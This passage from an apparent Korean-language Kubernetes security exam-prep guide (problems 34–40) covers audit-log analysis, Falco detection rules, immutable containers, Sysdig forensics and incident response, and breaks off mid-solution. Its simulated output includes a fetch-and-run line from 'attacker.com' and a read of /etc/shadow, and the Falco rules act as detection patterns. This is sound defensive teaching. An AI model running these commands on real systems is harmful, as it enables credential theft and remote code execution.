# API server 재시작 대기
watch crictl ps | grep kube-apiserver

# 검증: audit 로그 확인
tail -1 /var/log/kubernetes/audit/audit.log | jq .
```

Audit Policy의 규칙은 위에서 아래로 순서대로 평가되며, 첫 번째로 매칭되는 규칙이 적용된다. 따라서 규칙의 순서가 매우 중요하다. 구체적인 규칙을 먼저 배치하고 catch-all 규칙을 마지막에 배치해야 한다.

**검증 - 공격 시뮬레이션:**
```bash
# Secret 접근 시 RequestResponse 레벨로 기록되는지 확인
kubectl get secret my-secret -n default
tail -5 /var/log/kubernetes/audit/audit.log | jq 'select(.objectRef.resource == "secrets") | {verb, level: .level, user: .user.username}'
```
```text
{
  "verb": "get",
  "level": "RequestResponse",
  "user": "kubernetes-admin"
}
```
```bash
# Pod 생성 시 Request 레벨로 기록되는지 확인
kubectl run test-audit --image=nginx
tail -5 /var/log/kubernetes/audit/audit.log | jq 'select(.objectRef.resource == "pods" and .verb == "create") | {verb, level: .level}'
```
```text
{
  "verb": "create",
  "level": "Request"
}
```
```bash
# 시스템 컴포넌트의 읽기 요청은 기록되지 않음 확인
cat /var/log/kubernetes/audit/audit.log | jq 'select(.user.groups[]? == "system:nodes" and .verb == "get")' | wc -l
```
```text
0
```

**출제 의도:** Kubernetes Audit Policy를 작성하여 보안 관련 API 호출을 체계적으로 기록하는 능력을 검증한다. 감사 로그는 보안 사고 분석의 핵심 데이터이다.

**핵심 원리:** Audit Policy는 API server가 요청을 처리할 때 어떤 이벤트를 어떤 수준으로 기록할지 결정한다. 4가지 레벨이 있다: `None`(기록 안 함), `Metadata`(요청 메타데이터만), `Request`(요청 본문 포함), `RequestResponse`(요청+응답 본문 포함). 규칙은 first-match 방식으로 평가된다. `omitStages: ["RequestReceived"]`는 요청 수신 단계의 중복 로그를 제거한다. Secret은 민감 데이터이므로 RequestResponse로 기록하여 누가 언제 어떤 Secret에 접근했는지 추적한다.

**함정과 주의사항:**
- 규칙 순서가 핵심이다. 시스템 컴포넌트 제외 규칙(None)을 Secret 규칙(RequestResponse) 앞에 두면, 시스템 컴포넌트의 Secret 접근이 기록되지 않는다.
- `--audit-log-path`, `--audit-policy-file` 모두 volume/volumeMount가 필요하다. 하나라도 빠뜨리면 API server가 시작되지 않는다.
- `--audit-log-maxsize`, `--audit-log-maxbackup`, `--audit-log-maxage`를 설정하지 않으면 로그가 무한 증가하여 디스크가 가득 찬다.
- RequestResponse 레벨은 Secret의 데이터가 audit 로그에 평문으로 기록될 수 있다. audit 로그 파일의 보안도 중요하다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| Secret 무단 접근 | RequestResponse 로깅으로 접근자/시간/내용 추적 |
| 무단 Pod 생성(크립토마이너 등) | Pod create/delete 로깅으로 탐지 |
| 감사 로그 우회 | 포괄적 catch-all 규칙으로 모든 요청 기록 |
</details>

---

### 문제 34. [Runtime Security] Audit 로그 분석

API server의 audit 로그(`/var/log/kubernetes/audit/audit.log`)를 분석하여 다음을 찾아라:
1. 지난 1시간 내에 Secret을 삭제한 사용자
2. `kube-system` 네임스페이스에서 Pod를 생성한 요청

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. Secret을 삭제한 사용자 찾기
cat /var/log/kubernetes/audit/audit.log | \
  jq -r 'select(.verb == "delete" and .objectRef.resource == "secrets") |
  "\(.requestReceivedTimestamp) - User: \(.user.username), Secret: \(.objectRef.namespace)/\(.objectRef.name)"'

# 2. kube-system에서 Pod를 생성한 요청 찾기
cat /var/log/kubernetes/audit/audit.log | \
  jq -r 'select(.verb == "create" and .objectRef.resource == "pods" and .objectRef.namespace == "kube-system") |
  "\(.requestReceivedTimestamp) - User: \(.user.username), Pod: \(.objectRef.name)"'

# 3. 특정 사용자의 모든 활동 추적
cat /var/log/kubernetes/audit/audit.log | \
  jq -r 'select(.user.username == "suspicious-user") |
  "\(.requestReceivedTimestamp) \(.verb) \(.objectRef.resource)/\(.objectRef.name)"'

# 4. 실패한 요청(403 Forbidden) 찾기
cat /var/log/kubernetes/audit/audit.log | \
  jq -r 'select(.responseStatus.code == 403) |
  "\(.requestReceivedTimestamp) - User: \(.user.username), Action: \(.verb) \(.objectRef.resource)"'
```

Audit 로그는 JSON 형식이며, `jq`를 사용하여 필터링할 수 있다. 주요 필드는 `user.username`, `verb`, `objectRef.resource`, `objectRef.namespace`, `objectRef.name`, `responseStatus.code`, `requestReceivedTimestamp`이다.

**검증 - 공격 시뮬레이션:**
```bash
# Secret 삭제 이벤트 분석
cat /var/log/kubernetes/audit/audit.log | \
  jq -r 'select(.verb == "delete" and .objectRef.resource == "secrets") |
  "\(.requestReceivedTimestamp) - User: \(.user.username), Secret: \(.objectRef.namespace)/\(.objectRef.name)"'
```
```text
2026-03-30T10:15:30.123456Z - User: suspicious-user, Secret: production/db-credentials
2026-03-30T10:16:45.789012Z - User: suspicious-user, Secret: production/tls-cert
```
```bash
# kube-system에서 Pod 생성 이벤트 분석
cat /var/log/kubernetes/audit/audit.log | \
  jq -r 'select(.verb == "create" and .objectRef.resource == "pods" and .objectRef.namespace == "kube-system") |
  "\(.requestReceivedTimestamp) - User: \(.user.username), Pod: \(.objectRef.name)"'
```
```text
2026-03-30T09:30:00.000000Z - User: attacker, Pod: crypto-miner-pod
```
```bash
# 403 Forbidden 이벤트 (권한 상승 시도 탐지)
cat /var/log/kubernetes/audit/audit.log | \
  jq -r 'select(.responseStatus.code == 403) |
  "\(.requestReceivedTimestamp) - User: \(.user.username), Action: \(.verb) \(.objectRef.resource)"' | head -5
```
```text
2026-03-30T10:20:00.000000Z - User: dev-user, Action: delete secrets
2026-03-30T10:20:01.000000Z - User: dev-user, Action: create clusterrolebindings
```

**출제 의도:** Audit 로그를 분석하여 보안 이벤트를 식별하고 침해 지표(IoC)를 추출하는 능력을 검증한다. 사고 대응의 포렌식 단계에서 핵심 기술이다.

**핵심 원리:** Audit 로그는 JSON Lines 형식으로, 각 줄이 독립된 JSON 이벤트이다. `jq`의 `select()` 함수로 필드 값을 기반으로 필터링한다. 주요 분석 패턴: (1) 특정 리소스에 대한 위험 동작(delete secrets, create clusterrolebindings), (2) 비정상 시간대의 활동, (3) 반복적 403 에러(권한 상승 시도), (4) 시스템 네임스페이스에 대한 비시스템 사용자의 활동.

**함정과 주의사항:**
- audit 로그 파일이 매우 클 수 있다. `jq`로 전체 파일을 파싱하면 시간이 오래 걸린다. `grep`으로 먼저 필터링한 후 `jq`로 파싱하면 빠르다.
- `requestReceivedTimestamp`는 UTC이다. 로컬 시간과 차이가 있을 수 있다.
- 시험에서 "지난 1시간"을 물어보면 `--since` 또는 시간 비교를 해야 한다. `jq`에서 시간 비교는 문자열 비교로 가능하다(ISO 8601 형식이므로).
- `user.username`이 `system:serviceaccount:<ns>:<name>` 형식이면 SA 토큰이 사용된 것이다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| Secret 무단 삭제 | audit 로그로 삭제 주체 식별 |
| kube-system에 악성 Pod 배포 | 생성 이벤트 로그로 탐지 |
| 권한 상승 시도(반복적 403) | 실패 로그 패턴으로 공격 탐지 |
</details>

---

### 문제 35. [Runtime Security] Falco 룰 작성 - 컨테이너 내 셸 탐지

Falco 커스텀 룰을 작성하여 컨테이너 내에서 셸이 실행될 때 탐지하도록 하라. 룰을 `/etc/falco/falco_rules.local.yaml`에 추가하고 Falco를 재시작하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
vi /etc/falco/falco_rules.local.yaml
```
```yaml
- rule: Detect Shell in Container
  desc: 컨테이너 내에서 셸 프로세스가 실행되면 탐지한다
  condition: >
    spawned_process and
    container and
    proc.name in (bash, sh, zsh, dash, ksh, csh)
  output: >
    셸이 컨테이너에서 실행됨
    (user=%user.name container_id=%container.id
    container_name=%container.name shell=%proc.name
    parent=%proc.pname cmdline=%proc.cmdline
    image=%container.image.repository:%container.image.tag
    pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: WARNING
  tags: [container, shell, mitre_execution]
```
```bash
# Falco 재시작
systemctl restart falco

# Falco 상태 확인
systemctl status falco

# 검증: 컨테이너에서 셸 실행
kubectl exec -it nginx-pod -- /bin/bash

# Falco 로그에서 탐지 확인
journalctl -u falco --since "1 minute ago" | grep "Shell"
# 또는
tail -f /var/log/syslog | grep falco
```

Falco 룰은 `/etc/falco/falco_rules.local.yaml`에 추가해야 한다. `falco_rules.yaml`(기본 룰 파일)은 직접 수정하지 않는 것이 원칙이다. 업그레이드 시 덮어쓰여질 수 있기 때문이다.

**검증 - 공격 시뮬레이션:**
```bash
# 컨테이너에서 셸 실행 (탐지 대상)
kubectl exec -it nginx-pod -- /bin/bash
exit
```
```bash
# Falco 로그에서 탐지 확인
journalctl -u falco --since "1 minute ago" | grep "Shell"
```
```text
Mar 30 10:15:30 node01 falco: WARNING 셸이 컨테이너에서 실행됨 (user=root container_id=abc123def container_name=nginx shell=bash parent=runc cmdline=bash image=nginx:1.25 pod=nginx-pod ns=default)
```
```bash
# sh로 실행해도 탐지
kubectl exec nginx-pod -- sh -c "whoami"
```
```bash
journalctl -u falco --since "1 minute ago" | grep "Shell"
```
```text
Mar 30 10:16:00 node01 falco: WARNING 셸이 컨테이너에서 실행됨 (user=root container_id=abc123def container_name=nginx shell=sh parent=runc cmdline=sh -c whoami image=nginx:1.25 pod=nginx-pod ns=default)
```

**출제 의도:** Falco를 사용하여 런타임 보안 이벤트를 탐지하는 룰을 작성하는 능력을 검증한다. 컨테이너 내 셸 실행은 가장 흔한 초기 침해 지표이다.

**핵심 원리:** Falco는 Linux 커널의 시스템콜을 eBPF(또는 커널 모듈)로 가로채어 실시간으로 분석한다. `spawned_process`는 `execve` 시스템콜이 성공적으로 호출된 것을 의미하는 Falco 내장 매크로이다. `container`는 `container.id != host`를 의미하여 컨테이너 내 프로세스만 필터링한다. `proc.name in (bash, sh, ...)`는 실행된 프로세스 이름을 셸 목록과 비교한다.

**함정과 주의사항:**
- `falco_rules.local.yaml`에 작성해야 한다. `falco_rules.yaml`을 수정하면 Falco 업그레이드 시 덮어쓰여진다.
- YAML 형식의 `condition` 필드에서 Falco 필터 구문을 사용한다. Rego나 jq 구문과 혼동하면 안 된다.
- Falco 재시작 후 `systemctl status falco`로 에러가 없는지 확인하라. YAML 문법 오류가 있으면 Falco가 시작되지 않는다.
- `output` 필드에 `%k8s.pod.name`과 `%k8s.ns.name`을 포함해야 Kubernetes 컨텍스트를 파악할 수 있다.
- `tags` 필드는 MITRE ATT&CK 프레임워크와 매핑하여 위협 분류에 활용된다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| kubectl exec를 통한 대화형 셸 접근 | Falco가 셸 프로세스 탐지 및 경고 |
| 리버스 셸 연결 후 대화형 접근 | 셸 프로세스 생성 시점에 탐지 |
| 웹셸을 통한 명령 실행 | 셸 프로세스(sh -c ...)가 생성되면 탐지 |
</details>

---

### 문제 36. [Runtime Security] Falco 룰 작성 - 민감 파일 접근 탐지

Falco 커스텀 룰을 작성하여 컨테이너에서 `/etc/shadow` 파일을 읽는 것을 탐지하라. 우선순위는 CRITICAL로 설정하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
vi /etc/falco/falco_rules.local.yaml
```

기존 룰에 추가:
```yaml
- rule: Read Shadow File in Container
  desc: 컨테이너에서 /etc/shadow 파일을 읽으면 탐지한다
  condition: >
    open_read and
    container and
    fd.name = /etc/shadow
  output: >
    /etc/shadow 파일이 컨테이너에서 읽힘 (매우 위험)
    (user=%user.name container_id=%container.id
    container_name=%container.name
    image=%container.image.repository
    pod=%k8s.pod.name ns=%k8s.ns.name
    proc=%proc.name cmdline=%proc.cmdline)
  priority: CRITICAL
  tags: [filesystem, sensitive_file, mitre_credential_access]
```
```bash
# Falco 재시작
systemctl restart falco

# 검증: 컨테이너에서 /etc/shadow 읽기 시도
kubectl exec nginx-pod -- cat /etc/shadow

# Falco 로그 확인
journalctl -u falco --since "1 minute ago" | grep "shadow"
```

`open_read`는 Falco의 내장 매크로로, 파일을 읽기 모드로 여는 시스템콜을 감지한다. `fd.name`은 열린 파일의 경로를 나타낸다. CRITICAL 우선순위는 즉시 대응이 필요한 보안 이벤트를 의미한다.

**검증 - 공격 시뮬레이션:**
```bash
# 컨테이너에서 /etc/shadow 읽기 시도 (공격 시뮬레이션)
kubectl exec nginx-pod -- cat /etc/shadow
```
```text
root:*:19000:0:99999:7:::
daemon:*:19000:0:99999:7:::
...
```
```bash
# Falco 로그에서 CRITICAL 탐지 확인
journalctl -u falco --since "1 minute ago" | grep "shadow"
```
```text
Mar 30 10:20:00 node01 falco: CRITICAL /etc/shadow 파일이 컨테이너에서 읽힘 (매우 위험) (user=root container_id=abc123 container_name=nginx image=nginx pod=nginx-pod ns=default proc=cat cmdline=cat /etc/shadow)
```
```bash
# /etc/passwd 읽기와 구분하여 /etc/shadow만 탐지되는지 확인
kubectl exec nginx-pod -- cat /etc/passwd
journalctl -u falco --since "1 minute ago" | grep "shadow"
# /etc/passwd 읽기는 이 룰에 의해 탐지되지 않음 (fd.name != /etc/shadow)
```

**출제 의도:** 민감 파일 접근을 실시간으로 탐지하는 Falco 룰을 작성하는 능력을 검증한다. `/etc/shadow`는 해시된 비밀번호가 저장된 파일로, 접근 시 credential harvesting 시도로 간주한다.

**핵심 원리:** `open_read`는 `evt.type in (open, openat, openat2) and evt.is_open_read=true` 조건을 포함하는 Falco 내장 매크로이다. 커널의 VFS 계층에서 `open()` 시스템콜을 가로채어 파일 디스크립터(fd)의 이름과 열기 모드를 검사한다. `fd.name = /etc/shadow`는 정확한 경로 일치를 수행한다. CRITICAL 우선순위는 Falco의 출력 채널(syslog, HTTP webhook 등)에서 즉시 알림을 트리거한다.

**함정과 주의사항:**
- `fd.name = /etc/shadow`는 정확 일치이다. `fd.name contains shadow`를 사용하면 `/etc/shadow-` 등 관련 파일도 잡지만 오탐도 증가한다.
- `open_read`는 읽기 모드로 열 때만 탐지한다. 쓰기를 탐지하려면 `open_write`를 사용하라.
- Falco 재시작 시 YAML 구문 에러가 있으면 서비스가 시작되지 않는다. `falco --validate /etc/falco/falco_rules.local.yaml`로 먼저 검증하라.
- `priority: CRITICAL`은 대소문자를 구분하지 않지만, 일관성을 위해 대문자를 사용하라.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| /etc/shadow 읽기로 비밀번호 해시 탈취 | Falco CRITICAL 알림으로 즉시 탐지 |
| John the Ripper 등으로 오프라인 크래킹 | 조기 탐지로 비밀번호 변경 시간 확보 |
| 컨테이너 탈출 후 호스트 /etc/shadow 접근 | 호스트 레벨 Falco도 탐지 가능 |
</details>

---

### 문제 37. [Runtime Security] 컨테이너 불변성 적용

`production` 네임스페이스에서 실행 중인 `web` Deployment를 수정하여 컨테이너를 불변(immutable)으로 만들어라:
1. readOnlyRootFilesystem 활성화
2. 필요한 쓰기 디렉토리만 emptyDir로 마운트
3. 권한 상승 비활성화

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
kubectl edit deployment web -n production
```

수정할 내용:
```yaml
spec:
  template:
    spec:
      containers:
      - name: nginx
        image: nginx:1.25
        securityContext:
          readOnlyRootFilesystem: true
          allowPrivilegeEscalation: false
          runAsNonRoot: true
          runAsUser: 1000
          capabilities:
            drop: ["ALL"]
        volumeMounts:
        - name: tmp
          mountPath: /tmp
        - name: cache
          mountPath: /var/cache/nginx
        - name: run
          mountPath: /var/run
        - name: log
          mountPath: /var/log/nginx
      volumes:
      - name: tmp
        emptyDir: {}
      - name: cache
        emptyDir: {}
      - name: run
        emptyDir: {}
      - name: log
        emptyDir: {}
```
```bash
# 롤아웃 상태 확인
kubectl rollout status deployment web -n production

# 검증
kubectl exec -it $(kubectl get pod -n production -l app=web -o name | head -1) -n production -- touch /root/test
# Read-only file system

kubectl exec -it $(kubectl get pod -n production -l app=web -o name | head -1) -n production -- touch /tmp/test
# (성공)
```

`readOnlyRootFilesystem: true`를 설정하면 컨테이너 내에서 파일을 수정할 수 없다. 이는 악성 코드가 바이너리를 설치하거나 설정 파일을 변조하는 것을 방지한다. nginx는 `/var/cache/nginx`, `/var/run`, `/var/log/nginx` 등에 쓰기 권한이 필요하므로 emptyDir로 마운트해야 한다.

**검증 - 공격 시뮬레이션:**
```bash
# 루트 파일시스템에 악성 파일 생성 시도 (차단)
POD=$(kubectl get pod -n production -l app=web -o name | head -1)
kubectl exec -it $POD -n production -- touch /usr/bin/backdoor
```
```text
touch: /usr/bin/backdoor: Read-only file system
command terminated with exit code 1
```
```bash
# 설정 파일 변조 시도 (차단)
kubectl exec -it $POD -n production -- sh -c 'echo "malicious" >> /etc/nginx/nginx.conf'
```
```text
sh: can't create /etc/nginx/nginx.conf: Read-only file system
```
```bash
# 허용된 emptyDir 경로에는 쓰기 가능 (정상 동작)
kubectl exec -it $POD -n production -- touch /tmp/test
kubectl exec -it $POD -n production -- ls /tmp/test
```
```text
/tmp/test
```
```bash
# Deployment 롤아웃 확인
kubectl rollout status deployment web -n production
```
```text
deployment "web" successfully rolled out
```

**출제 의도:** 컨테이너 불변성(immutability) 원칙을 적용하여 런타임 변조를 방지하는 능력을 검증한다. 불변 컨테이너는 공격자가 파일을 수정하거나 악성 도구를 설치하는 것을 차단한다.

**핵심 원리:** `readOnlyRootFilesystem: true`는 컨테이너의 rootfs를 읽기 전용으로 마운트한다. 커널의 VFS 계층에서 쓰기 시도를 EROFS(Read-only file system) 에러로 거부한다. emptyDir은 tmpfs 또는 노드의 로컬 디스크에 별도로 마운트되므로 읽기 전용 제한을 받지 않는다. `allowPrivilegeEscalation: false`는 `PR_SET_NO_NEW_PRIVS` 커널 플래그를 설정하여 setuid 바이너리의 권한 상승을 차단한다.

**함정과 주의사항:**
- nginx는 `/var/cache/nginx`, `/var/run`, `/var/log/nginx` 등에 쓰기가 필요하다. 이 경로들을 빠짐없이 emptyDir로 마운트해야 nginx가 정상 시작된다.
- Deployment를 수정하면 새 ReplicaSet이 생성되어 롤링 업데이트가 수행된다. `kubectl rollout status`로 완료를 확인하라.
- 일부 애플리케이션은 PID 파일, 소켓 파일 등을 특정 경로에 생성한다. 해당 경로도 emptyDir로 마운트해야 한다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 웹셸/백도어 바이너리 설치 | readOnlyRootFilesystem으로 파일 쓰기 차단 |
| 설정 파일 변조(nginx.conf, resolv.conf 등) | 읽기 전용이므로 변조 불가 |
| 크론탭/시스템 서비스 추가로 지속성 확보 | 시스템 경로 쓰기 차단 |
| setuid 바이너리로 권한 상승 | allowPrivilegeEscalation: false로 차단 |
</details>

---

### 문제 38. [Runtime Security] Falco 로그 분석

Falco 로그(`/var/log/syslog` 또는 `journalctl -u falco`)를 분석하여 다음을 식별하라:
1. 지난 5분간 컨테이너에서 셸이 실행된 이벤트
2. 해당 이벤트의 컨테이너 이름, Pod 이름, 네임스페이스, 실행된 명령어

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. 지난 5분간 Falco 로그에서 셸 관련 이벤트 검색
journalctl -u falco --since "5 minutes ago" | grep -i "shell"

# 또는 syslog에서 검색
grep -i "shell" /var/log/syslog | tail -20

# 2. 상세 정보 추출
journalctl -u falco --since "5 minutes ago" --no-pager | \
  grep -i "shell" | \
  grep -oP 'container_name=\K[^ ]*|pod=\K[^ ]*|ns=\K[^ ]*|cmdline=\K[^ )]*'

# 3. 출력 예시 분석:
# WARNING 셸이 컨테이너에서 실행됨
# (user=root container_id=abc123
#  container_name=nginx shell=bash
#  parent=runc cmdline=bash
#  image=nginx:1.25
#  pod=web-pod-7d8f9 ns=production)

# 4. 결과를 파일로 저장
journalctl -u falco --since "5 minutes ago" | grep -i "shell" > /tmp/falco-shell-events.txt

# 5. 이벤트 수 카운트
journalctl -u falco --since "5 minutes ago" | grep -ci "shell"
```

Falco의 출력에서 `container_name`, `pod`, `ns`(네임스페이스), `cmdline` 필드를 확인할 수 있다. 이 정보를 바탕으로 어떤 Pod에서 누가 셸을 실행했는지 파악하고 대응할 수 있다.

**검증 - 공격 시뮬레이션:**
```bash
# 셸 이벤트 검색 및 상세 정보 추출
journalctl -u falco --since "5 minutes ago" --no-pager | grep -i "shell"
```
```text
Mar 30 10:25:00 node01 falco: WARNING 셸이 컨테이너에서 실행됨 (user=root container_id=a1b2c3 container_name=nginx shell=bash parent=runc cmdline=bash image=nginx:1.25 pod=web-pod-7d8f9 ns=production)
Mar 30 10:26:30 node01 falco: WARNING 셸이 컨테이너에서 실행됨 (user=root container_id=d4e5f6 container_name=app shell=sh parent=runc cmdline=sh -c whoami image=myapp:v1.0 pod=app-pod-3k9xz ns=staging)
```
```bash
# 이벤트 수 카운트
journalctl -u falco --since "5 minutes ago" | grep -ci "shell"
```
```text
2
```
```bash
# 결과를 파일로 저장
journalctl -u falco --since "5 minutes ago" | grep -i "shell" > /tmp/falco-shell-events.txt
cat /tmp/falco-shell-events.txt
```
```text
Mar 30 10:25:00 node01 falco: WARNING 셸이 컨테이너에서 실행됨 (user=root container_id=a1b2c3 container_name=nginx shell=bash parent=runc cmdline=bash image=nginx:1.25 pod=web-pod-7d8f9 ns=production)
Mar 30 10:26:30 node01 falco: WARNING 셸이 컨테이너에서 실행됨 (user=root container_id=d4e5f6 container_name=app shell=sh parent=runc cmdline=sh -c whoami image=myapp:v1.0 pod=app-pod-3k9xz ns=staging)
```

**출제 의도:** Falco 로그를 분석하여 보안 이벤트의 상세 정보를 추출하고 대응 조치를 수립하는 능력을 검증한다. 로그 분석은 사고 대응의 핵심 기술이다.

**핵심 원리:** Falco의 출력은 룰의 `output` 필드에 정의된 형식으로 기록된다. `%container.name`, `%k8s.pod.name`, `%k8s.ns.name` 등은 Falco가 커널 이벤트와 Kubernetes 메타데이터를 매핑하여 제공하는 필드이다. journalctl은 systemd의 저널 로그를 조회하며, `--since`로 시간 범위를 지정할 수 있다. Falco 출력은 syslog, file, HTTP webhook, gRPC 등 다양한 채널로 전송할 수 있다.

**함정과 주의사항:**
- Falco 로그의 위치는 설정에 따라 다르다. systemd 서비스로 실행되면 `journalctl -u falco`, 직접 실행이면 `/var/log/syslog` 또는 Falco 설정의 `file_output.filename`을 확인하라.
- `--since "5 minutes ago"`는 시스템 시간 기준이다. NTP 동기화가 안 되어 있으면 시간이 맞지 않을 수 있다.
- grep의 `-i`(대소문자 무시)를 사용하면 Shell, shell, SHELL 모두 매칭된다.
- 시험에서 결과를 "파일로 저장"하라고 하면 정확한 파일 경로에 저장해야 채점된다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 다수 컨테이너에 대한 동시 셸 접근 | 로그 분석으로 침해 범위 파악 |
| 특정 네임스페이스 타겟 공격 | ns 필드로 공격 대상 식별 |
| 반복적 셸 접근 패턴 | 이벤트 카운트로 자동화된 공격 탐지 |
</details>

---

### 문제 39. [Runtime Security] Sysdig 시스템콜 분석

Sysdig 캡처 파일 `/root/capture.scap`을 분석하여 다음을 찾아라:
1. `nginx` 컨테이너에서 열린 모든 파일 목록
2. `nginx` 컨테이너에서 실행된 프로세스 목록

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. nginx 컨테이너에서 열린 파일 목록
sysdig -r /root/capture.scap \
  "container.name=nginx and evt.type=open" \
  -p "%evt.time %proc.name %fd.name"

# 2. nginx 컨테이너에서 실행된 프로세스 목록
sysdig -r /root/capture.scap \
  "container.name=nginx and evt.type=execve and evt.dir=<" \
  -p "%evt.time %proc.name %proc.cmdline"

# 3. 특정 파일에 접근한 이벤트 필터링
sysdig -r /root/capture.scap \
  "container.name=nginx and fd.name contains /etc/passwd"

# 4. 네트워크 연결 이벤트
sysdig -r /root/capture.scap \
  "container.name=nginx and evt.type=connect" \
  -p "%evt.time %proc.name %fd.name"

# 5. chisel을 사용한 요약
sysdig -r /root/capture.scap -c topprocs_cpu container.name=nginx
sysdig -r /root/capture.scap -c topfiles_bytes container.name=nginx

# 6. 파일 쓰기 이벤트만 필터링
sysdig -r /root/capture.scap \
  "container.name=nginx and evt.type in (write, writev) and fd.type=file" \
  -p "%evt.time %proc.name %fd.name %evt.buffer"
```

Sysdig의 `-r` 옵션은 미리 캡처된 파일을 읽는다. `-p` 옵션은 출력 형식을 지정한다. 필터 표현식에서 `container.name`, `evt.type`, `proc.name`, `fd.name` 등의 필드를 사용하여 원하는 이벤트만 추출할 수 있다.

**검증 - 공격 시뮬레이션:**
```bash
# nginx 컨테이너에서 열린 파일 목록
sysdig -r /root/capture.scap \
  "container.name=nginx and evt.type=open" \
  -p "%evt.time %proc.name %fd.name" | head -10
```
```text
10:00:01.123456 nginx /etc/nginx/nginx.conf
10:00:01.234567 nginx /var/log/nginx/access.log
10:00:05.345678 cat /etc/shadow
10:00:06.456789 wget /tmp/malware.sh
```
```bash
# nginx 컨테이너에서 실행된 프로세스 목록 (의심스러운 프로세스 식별)
sysdig -r /root/capture.scap \
  "container.name=nginx and evt.type=execve and evt.dir=<" \
  -p "%evt.time %proc.name %proc.cmdline"
```
```text
10:00:05.000000 cat cat /etc/shadow
10:00:06.000000 wget wget http://attacker.com/malware.sh
10:00:07.000000 sh sh /tmp/malware.sh
```
```bash
# 네트워크 연결 이벤트 (C2 서버 연결 확인)
sysdig -r /root/capture.scap \
  "container.name=nginx and evt.type=connect" \
  -p "%evt.time %proc.name %fd.name"
```
```text
10:00:06.100000 wget 10.0.0.1:80->203.0.113.50:443
```

**출제 의도:** Sysdig 캡처 파일을 분석하여 컨테이너의 시스템콜 수준 활동을 조사하는 능력을 검증한다. 포렌식 분석의 핵심 기술이다.

**핵심 원리:** Sysdig는 커널의 시스템콜 인터페이스를 후킹하여 모든 시스템콜과 그 인수를 캡처한다. `.scap` 파일은 캡처된 이벤트의 바이너리 형식이다. `evt.type=open`은 파일 열기 시스템콜을, `evt.type=execve`는 프로세스 실행 시스템콜을, `evt.type=connect`는 네트워크 연결 시스템콜을 필터링한다. `evt.dir=<`는 시스템콜의 반환(종료) 이벤트만 선택하여 성공한 호출만 표시한다. chisel은 사전 정의된 분석 스크립트이다.

**함정과 주의사항:**
- `evt.dir=<`(반환)와 `evt.dir=>`(진입)을 구분해야 한다. execve의 경우 `<`(반환)만 선택해야 성공적으로 실행된 프로세스만 표시된다.
- `-p` 옵션의 필드 이름은 `%` 접두사를 사용한다. 잘못된 필드명을 사용하면 빈 출력이 된다.
- `container.name`은 Docker/containerd 컨테이너 이름이다. Kubernetes Pod 이름과 다를 수 있다. `k8s.pod.name` 필드를 사용하면 Pod 이름으로 필터링할 수 있다.
- 시험에서 `.scap` 파일이 주어지면 `sysdig -r` 명령으로 분석한다. 실시간 캡처가 아닌 사후 분석이다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 민감 파일 접근(/etc/shadow 읽기) | open 이벤트 분석으로 접근 파일 식별 |
| 악성 도구 다운로드(wget, curl) | execve 이벤트로 실행된 명령 추적 |
| C2 서버 통신 | connect 이벤트로 외부 연결 대상 식별 |
| 파일 변조 | write 이벤트로 변경된 파일 식별 |
</details>

---

### 문제 40. [Runtime Security] 런타임 이상 탐지 및 대응

Falco가 다음 경고를 출력했다:
```
CRITICAL: 민감한 파일이 컨테이너에서 읽힘 (user=root file=/etc/shadow container_name=web pod=web-7d8f9 ns=production)
```

이 보안 이벤트에 대해 다음 대응 조치를 수행하라:
1. 해당 Pod를 식별하고 즉시 격리하라 (NetworkPolicy로 모든 트래픽 차단)
2. Pod의 컨테이너에서 실행 중인 프로세스를 확인하라
3. Pod를 삭제하고, Deployment의 보안 설정을 강화하라

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. 해당 Pod 확인
kubectl get pod web-7d8f9 -n production -o wide

# 2. NetworkPolicy로 즉시 격리 (모든 트래픽 차단)
```
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: isolate-compromised-pod
  namespace: production
spec:
  podSelector:
    matchLabels:
      # Pod의 라벨을 확인하여 지정
      app: web
      pod-template-hash: 7d8f9  # 특정 Pod만 격리
  policyTypes:
  - Ingress
  - Egress
  # ingress/egress 규칙 없음 = 모든 트래픽 차단
```
```bash
kubectl apply -f isolate-policy.yaml

# 3. 컨테이너에서 실행 중인 프로세스 확인
kubectl exec web-7d8f9 -n production -- ps aux
# 또는
kubectl exec web-7d8f9 -n production -- cat /proc/1/cmdline

# 4. 의심스러운 프로세스 확인
kubectl exec web-7d8f9 -n production -- ls -la /tmp/
kubectl exec web-7d8f9 -n production -- find / -newer /etc/shadow -type f 2>/dev/null

# 5. Pod 삭제 (Deployment가 새 Pod를 자동 생성)
kubectl delete pod web-7d8f9 -n production

# 6. Deployment 보안 설정 강화
kubectl edit deployment web -n production
```

Deployment에 추가/수정할 보안 설정:
```yaml
spec:
  template:
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        seccompProfile:
          type: RuntimeDefault
      containers:
      - name: web
        securityContext:
          readOnlyRootFilesystem: true
          allowPrivilegeEscalation: false
          capabilities:
            drop: ["ALL"]
        volumeMounts:
        - name: tmp
          mountPath: /tmp
      volumes:
      - name: tmp
        emptyDir: {}
```
```bash
# 7. 격리 정책 정리 (새 Pod에는 적용 필요 없음)
kubectl delete networkpolicy isolate-compromised-pod -n production

# 8. 롤아웃 확인
kubectl rollout status deployment web -n production
```

보안 사고 대응의 핵심 절차: 격리 -> 분석 -> 제거 -> 강화이다. 먼저 NetworkPolicy로 격리하여 추가 피해를 방지하고, 프로세스와 파일을 분석하여 침해 범위를 파악한 뒤, 감염된 Pod를 삭제하고 보안 설정을 강화하여 재발을 방지한다.

**검증 - 공격 시뮬레이션:**
```bash
